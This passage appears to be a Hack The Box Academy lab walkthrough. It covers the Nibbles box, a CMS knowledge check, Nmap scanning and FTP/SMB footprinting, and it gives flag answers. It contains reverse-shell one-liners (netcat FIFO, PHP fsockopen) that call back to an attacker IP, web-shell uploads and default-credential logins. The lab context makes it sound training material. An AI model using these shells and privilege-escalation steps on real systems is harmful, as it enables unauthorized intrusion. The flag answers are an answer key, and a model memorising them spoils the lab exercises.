<span class="normal"><a href="#__codelineno-12-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>-----BEGIN OPENSSH PRIVATE KEY-----
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>....
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>-----END OPENSSH PRIVATE KEY-----
</span></code></pre></div></td></tr></table></div>
<p>In our attacker machine we save that id_rsa key in our folder</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>echo &quot;the key&quot; &gt; id_rsa
</span></code></pre></div></td></tr></table></div>
<p>And now we can login as root</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>ssh root@$ip -p 31459 -i id_rsa
</span></code></pre></div></td></tr></table></div>
<p>And cat the flag:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>cat /root/flag.txt 
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>:  HTB{pr1v1l363_35c4l4710n_2_r007}</p>
<h3 id="attacking-your-first-box">Attacking your first box</h3>
<h4 id="nibbles-enumeration">Nibbles - Enumeration</h4>
<p><strong>Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>sudo nmap -sC -sV $ip
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>:  2.4.18</p>
<h4 id="nibbles-initial-foothold"><a href="https://academy.hackthebox.com/module/77/section/852">Nibbles - Initial Foothold</a></h4>
<p><strong>Gain a foothold on the target and submit the user.txt flag</strong></p>
<p>Enumerate resources</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
<span class="normal"><a href="#__codelineno-17-2">2</a></span>
<span class="normal"><a href="#__codelineno-17-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H &quot;HOST: $ip$&quot;
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>dirb http://$ip/nibbleblog/
</span></code></pre></div></td></tr></table></div>
<p>There are a lot of directory listing enabled. And eventually we can browser to:
http://$ip/nibbleblog/content/private/users.xml</p>
<p>We can identify the user admin.</p>
<p><img alt="admin user" src="../img/htb-nibble_00.png" /></p>
<p>We could also enumerate http://$ip/nibbleblog/admin.php</p>
<p>Login access is admin:nibbles.</p>
<p>Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</p>
<p>Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ </p>
<p>Set a netcat listener</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>nc -lnvp 1234
</span></code></pre></div></td></tr></table></div>
<p>Click on the reverse shell "image.php" and we will get a reverse shell.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
<span class="normal"><a href="#__codelineno-19-2">2</a></span>
<span class="normal"><a href="#__codelineno-19-3">3</a></span>
<span class="normal"><a href="#__codelineno-19-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>whoami
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>#nibbler
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a>cat /home/nibbler/user.txt
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148</p>
<h4 id="nibbles-privilege-escalation"><a href="https://academy.hackthebox.com/module/77/section/853">Nibbles - Privilege Escalation</a></h4>
<p>Escalate privileges and submit the root.txt flag.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>cd /home/nibbler
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>sudo -l
</span></code></pre></div></td></tr></table></div>
<p>Results:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span>
<span class="normal"><a href="#__codelineno-22-2">2</a></span>
<span class="normal"><a href="#__codelineno-22-3">3</a></span>
<span class="normal"><a href="#__codelineno-22-4">4</a></span>
<span class="normal"><a href="#__codelineno-22-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>Matching Defaults entries for nibbler on Nibbles:
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a>User nibbler may run the following commands on Nibbles:
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a>    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
</span></code></pre></div></td></tr></table></div>
<p>The <code>nibbler</code> user can run the file <code>/home/nibbler/personal/stuff/monitor.sh</code> with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with <code>sudo</code> we should get a reverse shell back as the root user.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
<span class="normal"><a href="#__codelineno-23-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>unzip personal.zip
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>strings /home/nibbler/personal/stuff/monitor.sh
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IPattacker 8443 &gt;/tmp/f&#39; | tee -a monitor.sh
</span></code></pre></div></td></tr></table></div>
<p>In the attacker machine, open a new netcat:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>nc -lnvp 8443
</span></code></pre></div></td></tr></table></div>
<p>Run monitor.sh with sudo</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>sudo ./monitor.sh
</span></code></pre></div></td></tr></table></div>
<p>In the new netcat connection you are root.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>cat /root/root.txt
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: de5e5d6619862a8aa5b9b212314e0cdd</p>
<p>Alternative way: Metasploit </p>
<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="go">exploit/multi/http/nibbleblog_file_upload</span>
</span></code></pre></div></td></tr></table></div>
<h3 id="knowledge-check"><a href="https://academy.hackthebox.com/module/77/section/859">Knowledge Check</a></h3>
<p><strong>Spawn the target, gain a foothold and submit the contents of the user.txt flag.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>sudo nmap -sC -sV $ip
</span></code></pre></div></td></tr></table></div>
<p>Go to http://$ip/robots.txt</p>
<p>Go to http://$ip/admin</p>
<p>Enter admin:admin</p>
<p>Go to Edit Theme: http://$ip/admin/theme-edit.php</p>
<p>Add a pentesmonkey shell and set a netcat listener on port 1234</p>
<p>Add gettingstarte.htb to your hosts file</p>
<p>Open the blog and you will get a reverse shell</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>cat /home/mrb3n/user.txt
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: 7002d65b149b0a4d19132a66feed21d8</p>
<p><strong>After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.</strong></p>
<p>Check out our permissions</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>sudo -l
</span></code></pre></div></td></tr></table></div>
<p>Results:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span>
<span class="normal"><a href="#__codelineno-32-2">2</a></span>
<span class="normal"><a href="#__codelineno-32-3">3</a></span>
<span class="normal"><a href="#__codelineno-32-4">4</a></span>
<span class="normal"><a href="#__codelineno-32-5">5</a></span>
<span class="normal"><a href="#__codelineno-32-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>Matching Defaults entries for www-data on gettingstarted:
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2"></a>    env_reset, mail_badpass,
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3"></a>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4"></a>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5"></a>User www-data may run the following commands on gettingstarted:
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6"></a>    (ALL : ALL) NOPASSWD: /usr/bin/php
</span></code></pre></div></td></tr></table></div>
<p>Grab a simple php reverse shell such as:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a>php -r &#39;$sock=fsockopen(&quot;$AttackerIP&quot;,4444);exec(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</span></code></pre></div></td></tr></table></div>
<p>Set up a netcat listener on port 4444:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a>nc -lnvp
</span></code></pre></div></td></tr></table></div>
<p>Run as sudo:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a>sudo /usr/bin/php -r &#39;$sock=fsockopen(&quot;$AttackerIP&quot;,4444);exec(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
</span></code></pre></div></td></tr></table></div>
<p>You are root in the listener. Now</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a>cat /root/root.txt
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: f1fba6e9f71efb2630e6e34da6387842</p>
<h2 id="network-enumeration-with-nmap"><a href="https://academy.hackthebox.com/module/details/19">Network Enumeration with Nmap</a></h2>
<h3 id="host-enumeration">Host Enumeration</h3>
<h4 id="host-discovery"><a href="https://academy.hackthebox.com/module/19/section/101">Host Discovery</a></h4>
<p><strong>Based on the last result, find out which operating system it belongs to. Submit the name of the operating system as result.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1"></a>sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping 
</span></code></pre></div></td></tr></table></div>
<p><strong>Result</strong>: Windows</p>
<h4 id="host-and-port-scanning"><a href="https://academy.hackthebox.com/module/19/section/102">Host and Port Scanning</a></h4>
<p><strong>Find all TCP ports on your target. Submit the total number of found TCP ports as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1"></a>nmap $ip
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: 7</p>
<p><strong>Enumerate the hostname of your target and submit it as the answer. (case-sensitive):</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1"></a>sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
</span></code></pre></div></td></tr></table></div>
<p><strong>Results</strong>: nix-nmap-default</p>
<h4 id="saving-the-results"><a href="https://academy.hackthebox.com/module/19/section/104">Saving the Results</a></h4>
<p>Perform a full TCP port scan on your target and create an HTML report. Submit the number of the highest port as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1"></a>nmap $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: 31337</p>
<h4 id="service-enumeration"><a href="https://academy.hackthebox.com/module/19/section/103">Service Enumeration</a></h4>
<p>Enumerate all ports and their services. One of the services contains the flag you have to submit as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a>sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{pr0F7pDv3r510nb4nn3r}</p>
<h4 id="nmap-scripting-engine"><a href="https://academy.hackthebox.com/module/19/section/108">Nmap Scripting Engine</a></h4>
<p><strong>Use NSE and its scripts to find the flag that one of the services contain and submit it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a>sudo nmap $ip -p80 --script vuln
</span></code></pre></div></td></tr></table></div>
<p>Result:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-43-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-43-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-43-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-43-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-43-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-43-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-43-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-43-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-43-10">10</a></span>
<span class="normal"><a href="#__codelineno-43-11">11</a></span>
<span class="normal"><a href="#__codelineno-43-12">12</a></span>
<span class="normal"><a href="#__codelineno-43-13">13</a></span>
<span class="normal"><a href="#__codelineno-43-14">14</a></span>
<span class="normal"><a href="#__codelineno-43-15">15</a></span>
<span class="normal"><a href="#__codelineno-43-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a>Pre-scan script results:
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2"></a>| broadcast-avahi-dos: 
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3"></a>|   Discovered hosts:
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4"></a>|     224.0.0.251
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5"></a>|   After NULL UDP avahi packet DoS (CVE-2011-1002).
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6"></a>|_  Hosts are all up (not vulnerable).
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7"></a>Nmap scan report for 10.129.68.164
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8"></a>Host is up (0.047s latency).
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9"></a>
</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10"></a>PORT   STATE SERVICE
</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11"></a>80/tcp open  http
</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12"></a>|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13"></a>|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14"></a>|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15"></a>| http-enum: 
</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16"></a>|_  /robots.txt: Robots file
</span></code></pre></div></td></tr></table></div>
<p>Go to robots.txt and get the flag.</p>
<p>Results: HTB{873nniuc71bu6usbs1i96as6dsv26}</p>
<h3 id="bypass-security-measures">Bypass Security Measures</h3>
<h4 id="firewall-and-idsips-evasion-easy-lab"><a href="https://academy.hackthebox.com/module/19/section/117">Firewall and IDS/IPS Evasion - Easy Lab</a></h4>
<p>Our client wants to know if we can identify which operating system their provided machine is running on. Submit the OS name as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a>sudo nmap -sC -sV $ip -p80  -Pn --max-retries 3 --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
</span></code></pre></div></td></tr></table></div>
<p>Results: Ubuntu</p>
<h4 id="firewall-and-idsips-evasion-medium-lab"><a href="https://academy.hackthebox.com/module/19/section/118">Firewall and IDS/IPS Evasion - Medium Lab</a></h4>
<p>After the configurations are transferred to the system, our client wants to know if it is possible to find out our target's DNS server version. Submit the DNS server version of the target as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a>sudo nmap -sU -p53 --script dns-nsid $ip 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{GoTtgUnyze9Psw4vGjcuMpHRp}</p>
<h4 id="firewall-and-idsips-evasion-hard-lab"><a href="https://academy.hackthebox.com/module/19/section/119">Firewall and IDS/IPS Evasion - Hard Lab</a></h4>
<p>Now our client wants to know if it is possible to find out the version of the running services. Identify the version of service our client was talking about and submit the flag as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1"></a>sudo nc -nv -p 53 $ip  50000 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}</p>
<h2 id="footprinting"><a href="https://academy.hackthebox.com/module/details/112">Footprinting</a></h2>
<h3 id="host-based-enumeration">Host Based Enumeration</h3>
<h4 id="ftp">FTP</h4>
<p><strong>Which version of the FTP server is running on the target system? Submit the entire banner as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1"></a>nc -nv $ip 21
</span></code></pre></div></td></tr></table></div>
<p>Results: InFreight FTP v1.1</p>
<p>Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a>ftp $ip
</span></code></pre></div></td></tr></table></div>
<p>Enter user anonymous.</p>
<p>Enter password anonymous.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span>
<span class="normal"><a href="#__codelineno-49-2">2</a></span>
<span class="normal"><a href="#__codelineno-49-3">3</a></span>
<span class="normal"><a href="#__codelineno-49-4">4</a></span>
<span class="normal"><a href="#__codelineno-49-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a>ftp&gt; dir
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2"></a>ftp&gt; get flag.txt
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3"></a>ftp&gt; quit
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4"></a>
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5"></a>cat flag.
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}</p>
<h4 id="smb">SMB</h4>
<p><strong>What version of the SMB server is running on the target system? Submit the entire banner as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1"></a>sudo nmap $ip  -p445 -sV -A -sC
</span></code></pre></div></td></tr></table></div>
<p>Results: Samba smbd 4.6.2</p>
<p><strong>What is the name of the accessible share on the target?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a> smbclient  -L //$ip 
</span></code></pre></div></td></tr></table></div>
<p>Results: sambashare</p>
<p><strong>Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span>
<span class="normal"><a href="#__codelineno-52-2">2</a></span>
<span class="normal"><a href="#__codelineno-52-3">3</a></span>
<span class="normal"><a href="#__codelineno-52-4">4</a></span>
<span class="normal"><a href="#__codelineno-52-5">5</a></span>
<span class="normal"><a href="#__codelineno-52-6">6</a></span>
<span class="normal"><a href="#__codelineno-52-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1"></a>smbclient  //$ip/sambashare -U &quot;&quot;
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2"></a>dir
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3"></a>cd contents
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4"></a>ls
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5"></a>get flag.txt
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6"></a>quit
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}</p>
<p><strong>Find out which domain the server belongs to.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span>
<span class="normal"><a href="#__codelineno-53-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a>rpcclient -U &quot;&quot; $ip
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2"></a>rpcclient $&gt; querydominfo
</span></code></pre></div></td></tr></table></div>
<p>Results: DEVOPS</p>
<p><strong>Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.</strong></p>
